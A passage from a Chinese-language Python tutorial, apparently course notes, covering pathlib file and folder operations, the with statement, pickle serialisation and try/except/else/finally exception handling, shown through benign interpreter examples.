<p>还支持索引：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ps[0]</span><br><span class="line">WindowsPath(&#x27;C:/Users/goodb/AppData/Local/Programs/Python&#x27;)</span><br><span class="line">&gt;&gt;&gt; ps[1]</span><br><span class="line">WindowsPath(&#x27;C:/Users/goodb/AppData/Local/Programs&#x27;)</span><br><span class="line">&gt;&gt;&gt; ps[2]</span><br><span class="line">WindowsPath(&#x27;C:/Users/goodb/AppData/Local&#x27;)</span><br></pre></td></tr></table></figure></p>
<p><code>parts</code> 属性将路径的各个组件拆分成元组的形式：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p.parts</span><br><span class="line">(&#x27;C:\\&#x27;, &#x27;Users&#x27;, &#x27;goodb&#x27;, &#x27;AppData&#x27;, &#x27;Local&#x27;, &#x27;Programs&#x27;, &#x27;Python&#x27;, &#x27;Python39&#x27;)</span><br><span class="line">&gt;&gt;&gt; q.parts</span><br><span class="line">(&#x27;C:\\&#x27;, &#x27;Users&#x27;, &#x27;goodb&#x27;, &#x27;AppData&#x27;, &#x27;Local&#x27;, &#x27;Programs&#x27;, &#x27;Python&#x27;, &#x27;Python39&#x27;, &#x27;FishC.txt&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>最后，还可以查询文件或文件夹的状态信息：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p.stat()</span><br><span class="line">os.stat_result(st_mode=16895, st_ino=281474976983758, st_dev=1289007019, st_nlink=1, st_uid=0, st_gid=0, st_size=4096, st_atime=1648462096, st_mtime=1648205377, st_ctime=1605695407)</span><br><span class="line">&gt;&gt;&gt; q.stat()</span><br><span class="line">os.stat_result(st_mode=33206, st_ino=4503599627467517, st_dev=1289007019, st_nlink=1, st_uid=0, st_gid=0, st_size=0, st_atime=1648206152, st_mtime=1648206152, st_ctime=1648205377)</span><br></pre></td></tr></table></figure></p>
<p>比如这个 st_size 就是文件或文件夹的尺寸信息：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p.stat().st_size</span><br><span class="line">4096</span><br><span class="line">&gt;&gt;&gt; q.stat().st_size</span><br><span class="line">0</span><br></pre></td></tr></table></figure></p>
<p>使用 <code>resolve()</code> 方法可以将相对路径转换为绝对路径：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; Path(&#x27;./doc&#x27;).resolve()</span><br><span class="line">WindowsPath(&#x27;C:/Users/goodb/AppData/Local/Programs/Python/Python39/Doc&#x27;)</span><br><span class="line">&gt;&gt;&gt; Path(&#x27;../FishC&#x27;).resolve()</span><br><span class="line">WindowsPath(&#x27;C:/Users/goodb/AppData/Local/Programs/Python/FishC&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>最后还可以通过 iterdir() 获取当前路径下面的所有子文件和子文件夹对象：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p.iterdir()</span><br><span class="line">&lt;generator object Path.iterdir at 0x0000012D57CBE660&gt;</span><br></pre></td></tr></table></figure></p>
<p>最后还可以通过 iterdir() 获取当前路径下面的所有子文件和子文件夹对象：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p.iterdir()</span><br><span class="line">&lt;generator object Path.iterdir at 0x0000012D57CBE660&gt;</span><br></pre></td></tr></table></figure></p>
<p>它生成的是一个迭代器对象，所以可以放到 for 语句中去提取数据：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; for each in p.iterdir():</span><br><span class="line">...     print(each.name)</span><br><span class="line">... </span><br><span class="line">DLLs</span><br><span class="line">Doc</span><br><span class="line">FishC</span><br><span class="line">FishC.txt</span><br><span class="line">include</span><br><span class="line">Lib</span><br><span class="line">libs</span><br><span class="line">LICENSE.txt</span><br><span class="line">NEWS.txt</span><br><span class="line">python.exe</span><br><span class="line">python3.dll</span><br><span class="line">python39.dll</span><br><span class="line">pythonw.exe</span><br><span class="line">Scripts</span><br><span class="line">tcl</span><br><span class="line">Tools</span><br><span class="line">vcruntime140.dll</span><br><span class="line">vcruntime140_1.dll</span><br></pre></td></tr></table></figure></p>
<p>如果我们要将当前路径下面的所有文件整理成一个列表，可以这么做（注意，是文件，不包含文件夹，所以我们要加一个条件过滤）：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [x for x in p.iterdir() if x.is_file()]</span><br><span class="line">[WindowsPath(&#x27;FishC.txt&#x27;), WindowsPath(&#x27;LICENSE.txt&#x27;), WindowsPath(&#x27;NEWS.txt&#x27;), WindowsPath(&#x27;python.exe&#x27;), WindowsPath(&#x27;python3.dll&#x27;), WindowsPath(&#x27;python39.dll&#x27;), WindowsPath(&#x27;pythonw.exe&#x27;), WindowsPath(&#x27;vcruntime140.dll&#x27;), WindowsPath(&#x27;vcruntime140_1.dll&#x27;)]</span><br></pre></td></tr></table></figure><br>以上是用得比较多的，与路径查询相关的操作。</p>
<p>那么修改路径也是支持的，比如我们可以使用 mkdir() 方法来创建文件夹：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; n = p / &quot;FishC&quot;</span><br><span class="line">&gt;&gt;&gt; n.mkdir()</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><br><strong>注意，如果需要创建的文件夹已经存在，那么它就会报错：</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; n.mkdir()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#16&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    n.mkdir()</span><br><span class="line">  File &quot;C:\Users\goodb\AppData\Local\Programs\Python\Python39\lib\pathlib.py&quot;, line 1323, in mkdir</span><br><span class="line">    self._accessor.mkdir(self, mode)</span><br><span class="line">FileExistsError: [WinError 183] 当文件已存在时，无法创建该文件。: &#x27;C:\\Users\\goodb\\AppData\\Local\\Programs\\Python\\Python39\\FishC&#x27;</span><br></pre></td></tr></table></figure><br>也可以避开这个报错信息，我们设置其 exist_ok 参数的值为 True 即可：<br><code>&gt;&gt;&gt; n.mkdir(exist_ok=True)</code><br>还有一点需要注意的就是，如果路径中有存在多个不存在的父级目录，那么也会出错的，比如这样：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; n = p / &quot;FishC/A/B/C&quot;</span><br><span class="line">&gt;&gt;&gt; n.mkdir(exist_ok=True)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#22&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    n.mkdir(exist_ok=True)</span><br><span class="line">  File &quot;C:\Users\goodb\AppData\Local\Programs\Python\Python39\lib\pathlib.py&quot;, line 1323, in mkdir</span><br><span class="line">    self._accessor.mkdir(self, mode)</span><br><span class="line">FileNotFoundError: [WinError 3] 系统找不到指定的路径。: &#x27;C:\\Users\\goodb\\AppData\\Local\\Programs\\Python\\Python39\\FishC\\A\\B\\C&#x27;</span><br></pre></td></tr></table></figure><br>它也定义了一个参数用于对付这种情况，将 <code>parents</code> 参数设置为 <code>True</code> 就可以了：<br><code>&gt;&gt;&gt; n.mkdir(parents=True, exist_ok=True)</code></p>
<p><code>Path</code> 内部其实还打包了一个 <code>open()</code> 方法，除了不用传入路径之外，其它参数跟 <a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-210552-1-1.html">open()</a> 函数是一摸一样的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; n = n / &#x27;FishC.txt&#x27;</span><br><span class="line">&gt;&gt;&gt; n</span><br><span class="line">WindowsPath(&#x27;C:/Users/goodb/AppData/Local/Programs/Python/Python39/FishC/A/B/C/FishC.txt&#x27;)</span><br><span class="line">&gt;&gt;&gt; f = n.open(&#x27;w&#x27;)</span><br><span class="line">&gt;&gt;&gt; f.write(&quot;I love FishC.&quot;)</span><br><span class="line">13</span><br><span class="line">&gt;&gt;&gt; f.close()</span><br></pre></td></tr></table></figure></p>
<p>可以给文件或文件夹修改名字，使用 <code>rename()</code> 方法来实现：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; n.rename(&quot;NewFishC.txt&quot;)</span><br><span class="line">WindowsPath(&#x27;NewFishC.txt&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>然后使用 <code>replace()</code> 方法替换文件或文件夹：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; m = Path(&quot;NewFishC.txt&quot;)</span><br><span class="line">&gt;&gt;&gt; n</span><br><span class="line">WindowsPath(&#x27;C:/Users/goodb/AppData/Local/Programs/Python/Python39/FishC/A/B/C/FishC.txt&#x27;)</span><br><span class="line">&gt;&gt;&gt; m.replace(n)</span><br><span class="line">WindowsPath(&#x27;C:/Users/goodb/AppData/Local/Programs/Python/Python39/FishC/A/B/C/FishC.txt&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>还有删除操作，<code>rmdir()</code> 和 <code>unlink()</code> 方法，前者用于删除文件夹，后者用于删除文件：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; n.parent.rmdir()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File &quot;&lt;pyshell#6&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">n.parent.rmdir()</span><br><span class="line">File &quot;C:\Users\goodb\AppData\Local\Programs\Python\Python39\lib\pathlib.py&quot;, line 1363, in rmdir</span><br><span class="line">self._accessor.rmdir(self)</span><br><span class="line">OSError: [WinError 145] 目录不是空的。: &#x27;C:\\Users\\goodb\\AppData\\Local\\Programs\\Python\\Python39\\FishC\\A\\B\\C&#x27;</span><br></pre></td></tr></table></figure><br>可以看到，如果不是空文件夹，它是删不掉的，我们需要先把里面的文件删了：<br><code>&gt;&gt;&gt; n.unlink()</code><br>现在再删除文件夹，就 OK 啦：<br><code>&gt;&gt;&gt; n.parent.rmdir()</code><br>最后是功能强大的查找，由 <code>glob()</code> 方法来实现：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p = Path(&#x27;.&#x27;)</span><br><span class="line">&gt;&gt;&gt; list(p.glob(&quot;*.txt&quot;))</span><br><span class="line">[WindowsPath(&#x27;FishC.txt&#x27;), WindowsPath(&#x27;LICENSE.txt&#x27;), WindowsPath(&#x27;NEWS.txt&#x27;)]</span><br></pre></td></tr></table></figure></p>
<p>这就查找当前目录下的所有 <code>.txt</code>后缀的文件，如果要查找当前目录的下一级目录中的所有 <code>.py</code> 后缀的文件，可以这么写：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; list(p.glob(&#x27;*/*.py&#x27;))</span><br><span class="line">[WindowsPath(&#x27;Lib/abc.py&#x27;), WindowsPath(&#x27;Lib/aifc.py&#x27;), WindowsPath(&#x27;Lib/antigravity.py&#x27;), ...]</span><br></pre></td></tr></table></figure></p>
<p>好了，那么如果希望进行向下递归搜索，也就是查找当前目录以及该目录下面的所有子目录，可以使用两个星号<code>**</code>表示：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; list(p.glob(&#x27;**/*.py&#x27;))</span><br><span class="line">[WindowsPath(&#x27;Lib/abc.py&#x27;), WindowsPath(&#x27;Lib/aifc.py&#x27;), WindowsPath(&#x27;Lib/antigravity.py&#x27;), ...]</span><br></pre></td></tr></table></figure></p>
<h3 id="16-37-with-语句和上下文管理器"><a href="#16-37-with-语句和上下文管理器" class="headerlink" title="16.37 with 语句和上下文管理器"></a>16.37 with 语句和上下文管理器</h3><p>上下文管理器为文件操作提供了一种更为优雅的实现方式。<br>我们先来看一下传统的文件操作实现：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(&quot;FishC.txt&quot;, &quot;w&quot;)</span><br><span class="line">&gt;&gt;&gt; f.write(&quot;I love FishC.&quot;)</span><br><span class="line">13</span><br><span class="line">&gt;&gt;&gt; f.close()</span><br></pre></td></tr></table></figure></p>
<p>总结下来无非就是三板斧：打开文件 -&gt; 操作文件 -&gt; 关闭文件<br>那么使用 with 上下文管理器方案，应该如何实现呢？<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; with open(&quot;FishC.txt&quot;, &quot;w&quot;) as f:</span><br><span class="line">...     f.write(&quot;I love FishC.&quot;)</span><br><span class="line">... </span><br><span class="line">13</span><br></pre></td></tr></table></figure><br>两者是等效的，通俗来讲，对于文件操作这样的三板斧来说，上文就是打开文件，下文就是关闭文件，这个就是上下文管理器做的事情。<br>使用上下文管理器，最大的优势是能够确保资源的释放（在这里就是文件的正常关闭）。</p>
<h3 id="16-38-pickle"><a href="#16-38-pickle" class="headerlink" title="16.38 pickle"></a>16.38 pickle</h3><p>pickle 模块支持你将 Python 的代码序列化，解决的就是一个永久存储 Python 对象的问题。<br>说白了，就是将咱们的源代码，转变成 0101001 的二进制组合。<br>掌握 pickle，只需要学习两个函数的用法：一个是 dump()，另一个是 load()。<br>使用 dump() 函数将数据写入文件中（文件后缀要求是 .pkl）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">    </span><br><span class="line">x, y, z = 1, 2, 3</span><br><span class="line">s = &quot;FishC&quot;</span><br><span class="line">l = [&quot;小甲鱼&quot;, 520, 3.14]</span><br><span class="line">d = &#123;&quot;one&quot;:1, &quot;two&quot;:2&#125;</span><br><span class="line">    </span><br><span class="line">with open(&quot;data.pkl&quot;, &quot;wb&quot;) as f:</span><br><span class="line">    pickle.dump(x, f)</span><br><span class="line">    pickle.dump(y, f)</span><br><span class="line">    pickle.dump(z, f)</span><br><span class="line">    pickle.dump(s, f)</span><br><span class="line">    pickle.dump(l, f)</span><br><span class="line">    pickle.dump(d, f)</span><br></pre></td></tr></table></figure>
<p>使用 load() 函数读取 pickle 文件中的数据：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">    </span><br><span class="line">with open(&quot;data.pkl&quot;, &quot;rb&quot;) as f:</span><br><span class="line">    x = pickle.load(f)</span><br><span class="line">    y = pickle.load(f)</span><br><span class="line">    z = pickle.load(f)</span><br><span class="line">    s = pickle.load(f)</span><br><span class="line">    l = pickle.load(f)</span><br><span class="line">    d = pickle.load(f)</span><br><span class="line">    </span><br><span class="line">print(x, y, z, s, l, d, sep=&quot;\n&quot;)</span><br></pre></td></tr></table></figure></p>
<p>如果觉得反复写很多个 dump() 和 load() 太麻烦了，可以将多个对象打包成元组后再进行序列化：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">pickle.dump((x, y, z, s, l, d), f)</span><br><span class="line">...</span><br><span class="line">x, y, z, s, l, d = pickle.load(f)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<h3 id="16-39-异常"><a href="#16-39-异常" class="headerlink" title="16.39 异常"></a>16.39 异常</h3><h4 id="16-39-1-编程时通常会遇到的两类错误"><a href="#16-39-1-编程时通常会遇到的两类错误" class="headerlink" title="16.39.1 编程时通常会遇到的两类错误"></a>16.39.1 编程时通常会遇到的两类错误</h4><p>一类是语法错误，就是不按 Python 规定的语法来写代码，这也是初学者最容易犯的错误，比如：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(“I love FishC.”)</span><br><span class="line">SyntaxError: invalid character &#x27;“&#x27; (U+201C)</span><br></pre></td></tr></table></figure></p>
<p>另一类错误并非由于语法错误导致的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 1 / 0</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#3&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    1 / 0</span><br><span class="line">ZeroDivisionError: division by zero</span><br></pre></td></tr></table></figure><br>这里虽然 Python 的语法没有错，但由于没有过硬的小学数学知识，同样导致了代码无法正确执行，引发了 ZeroDivisionError 这个异常。</p>
<h4 id="16-39-2-异常机制"><a href="#16-39-2-异常机制" class="headerlink" title="16.39.2 异常机制"></a>16.39.2 异常机制</h4><p>Python 通过提供异常机制来识别及响应错误。<br>Python 的异常机制可以分离出程序中的异常处理代码和正常业务代码，使得程序代码更为优雅，并提高了程序的健壮性。</p>
<p>Python 内置异常大合集 -&gt; <a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-211613-1-1.html">传送门</a>（Python 的所有内置异常，全部都在这里了，大家遇到看不懂的异常信息，直接打开这个网页，然后 Ctrl+F，输入异常的名称就可以）</p>
<h4 id="16-39-3-处理异常"><a href="#16-39-3-处理异常" class="headerlink" title="16.39.3  处理异常"></a>16.39.3  处理异常</h4><p>利用 <code>try-except</code> 语句来捕获并处理异常语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    检测范围</span><br><span class="line">except [expression [as identifier]]:</span><br><span class="line">    异常处理代码</span><br></pre></td></tr></table></figure>
<p>举个例子：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; try:</span><br><span class="line">...     1 / 0</span><br><span class="line">... except:</span><br><span class="line">...     print(&quot;出错了~&quot;)</span><br><span class="line">... </span><br><span class="line">出错了~</span><br></pre></td></tr></table></figure></p>
<p>我们可以在 <code>except</code> 后面指定一个异常：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; try:</span><br><span class="line">...     1 / 0</span><br><span class="line">... except ZeroDivisionError:</span><br><span class="line">...     print(&quot;除数不能为0。&quot;)</span><br><span class="line">... </span><br><span class="line">除数不能为0。</span><br></pre></td></tr></table></figure><br>后面还有一个可选的 as，这样的话可以将异常的原因给提取出来：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; try:</span><br><span class="line">...     1 / 0</span><br><span class="line">... except ZeroDivisionError as e:</span><br><span class="line">...     print(e)</span><br><span class="line">... </span><br><span class="line">division by zero</span><br></pre></td></tr></table></figure><br>其实就是把冒号后面的那部分异常原因给引用出来。</p>
<p>我们还可以将多个可能出现的异常使用元组的形式给包裹起来：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; try:</span><br><span class="line">...     1 / 0</span><br><span class="line">...     520 + &quot;FishC&quot;</span><br><span class="line">... except (ZeroDivisionError, ValueError, TypeError):</span><br><span class="line">...     pass</span><br><span class="line">... </span><br></pre></td></tr></table></figure><br>在这个代码中，但凡检测到 try 语句中包含这三个异常中的任意一个，都会执行 pass 语句，直接忽略跳过。</p>
<p>最后也可以单独处理不同的异常，使用多个 except 语句就可以了：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; try:</span><br><span class="line">...     1 / 0</span><br><span class="line">...     520 + &quot;FishC&quot;</span><br><span class="line">... except ZeroDivisionError:</span><br><span class="line">...     print(&quot;除数不能为0。&quot;)</span><br><span class="line">... except ValueError:</span><br><span class="line">...     print(&quot;值不正确。&quot;)</span><br><span class="line">... except TypeError:</span><br><span class="line">...     print(&quot;类型不正确。&quot;)</span><br><span class="line">... </span><br><span class="line">除数不能为0。</span><br></pre></td></tr></table></figure></p>
<p><strong>try-except-else</strong></p>
<p><code>try-except</code> 还可以跟 <code>else</code> 进行搭配，它的含义就是当 <code>try</code> 语句没有检测到任何异常的情况下，就执行 <code>else</code> 语句的内容：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; try:</span><br><span class="line">...     1 / 0</span><br><span class="line">... except:</span><br><span class="line">...     print(&quot;逮到了~&quot;)</span><br><span class="line">... else:</span><br><span class="line">...     print(&quot;没逮到~&quot;)</span><br><span class="line">... </span><br><span class="line">逮到了~</span><br></pre></td></tr></table></figure></p>
<p>如果在 <code>try</code> 语句中检测到异常，那么就执行 except 语句的异常处理内容：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; try:</span><br><span class="line">...     1 / 1</span><br><span class="line">... except:</span><br><span class="line">...     print(&quot;逮到了~&quot;)</span><br><span class="line">... else:</span><br><span class="line">...     print(&quot;没逮到~&quot;)</span><br><span class="line">... </span><br><span class="line">1.0</span><br><span class="line">没逮到~</span><br></pre></td></tr></table></figure></p>
<p><strong>try-except-finally</strong></p>
<p>跟 <code>try-except</code> 语句搭配的还有一个 <code>finally</code>，就是说无论异常发生与否，都必须要执行的语句：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; try:</span><br><span class="line">...     1 / 0</span><br><span class="line">... except:</span><br><span class="line">...     print(&quot;逮到了~&quot;)</span><br><span class="line">... else:</span><br><span class="line">...     print(&quot;没逮到~&quot;)</span><br><span class="line">... finally:</span><br><span class="line">...     print(&quot;逮没逮到都会咯吱一声~&quot;)</span><br><span class="line">... </span><br><span class="line">逮到了~</span><br><span class="line">逮没逮到都会咯吱一声~</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; try:</span><br><span class="line">...     1 / 1</span><br><span class="line">... except:</span><br><span class="line">...     print(&quot;逮到了~&quot;)</span><br><span class="line">... else:</span><br><span class="line">...     print(&quot;没逮到~&quot;)</span><br><span class="line">... finally:</span><br><span class="line">...     print(&quot;逮没逮到都会咯吱一声~&quot;)</span><br><span class="line">... </span><br><span class="line">1.0</span><br><span class="line">没逮到~</span><br><span class="line">逮没逮到都会咯吱一声~</span><br></pre></td></tr></table></figure></p>
<p><code>finally</code> 通常是用于执行那些收尾工作，比如关闭文件的操作：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; try:</span><br><span class="line">...     f = open(&quot;FishC.txt&quot;, &quot;w&quot;)</span><br><span class="line">...     f.write(&quot;I love FishC.&quot;)</span><br><span class="line">... except:</span><br><span class="line">...     print(&quot;出错了~&quot;)</span><br><span class="line">... finally:</span><br><span class="line">...     f.close()</span><br></pre></td></tr></table></figure><br>这样的话，无论 try 语句中是否存在异常，文件都能够正常被关闭。</p>
<p>现在我们的异常处理语法变成了这样：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    检测范围</span><br><span class="line">except [expression [as identifier]]:</span><br><span class="line">    异常处理代码</span><br><span class="line">[except [expression [as identifier]]:</span><br><span class="line">    异常处理代码]*</span><br><span class="line">[else:</span><br><span class="line">    没有触发异常时执行的代码]</span><br><span class="line">[finally:</span><br><span class="line">    收尾工作执行的代码]</span><br></pre></td></tr></table></figure><br>或者：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    检测范围</span><br><span class="line">finally:</span><br><span class="line">    收尾工作执行的代码</span><br></pre></td></tr></table></figure></p>
